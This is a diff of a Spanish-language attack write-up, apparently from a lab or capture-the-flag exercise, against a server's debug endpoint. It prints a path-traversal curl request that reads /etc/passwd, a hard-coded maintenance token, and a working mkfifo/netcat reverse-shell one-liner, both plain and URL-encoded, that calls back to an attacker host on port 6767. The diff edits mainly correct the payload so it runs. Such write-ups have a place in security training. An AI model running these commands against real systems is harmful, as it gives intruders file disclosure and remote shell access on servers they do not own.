@@ -10,8 +10,6 @@ usage: ?file=<path>  |  ?cmd=<command>&token=<maintenance_token>
 La táctica usada para obtener control remoto en el servidor son dos stages, uno de exfiltración de archivo local para obtener credenciales de usuario
 
 ## LFI
-### [T1083 - File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)
-
 Exfiltramos los usuarios disponibles en el sistema con `curl 'http://10.1.0.8:5042/api/debug?file=../../../../etc/passwd'`
 
 Los usuarios reales que nos interesan son:
@@ -108,8 +106,8 @@ El token nos permitirá pasar al siguiente stage de **ejecución remota de coman
 El comando que nos va a permitir obtener una reverse shell es el siguiente:
 
 ```bash
-IP_ADDR='10.1.0.8'
-CMD=$(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 |nc $IP_ADDR 6767 >/tmp/f)
+HOST_ADDR='10.1.0.1'
+CMD="rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 |nc $HOST_ADDR 6767 >/tmp/f"
 PAYLOAD=$(echo $CMD | jq -rR @uri)
 
 ```
@@ -119,11 +117,12 @@ Codificado para pasarlo como parámetro:
 ```bash
 export ADMIN_TOKEN="h4l_d3bug_t0k3n_2024"
 
-curl "10.1.0.8:5042/api/debug?cmd=rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%20%7Cnc%2010.1.0.1%206767%20%3E%2Ftmp%2Ff&token=$ADMIN_TOKEN"
+curl "10.1.0.8:5042/api/debug?cmd=$PAYLOAD&token=$ADMIN_TOKEN"
 ```
 
 Con esto obtenemos una shell remota con el usuario dueño del proceso del servidor **www-data**.
 
-### Artefactos
-
 ### Mitigaciones
+
+### Fuentes
+- [T1083 - File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)
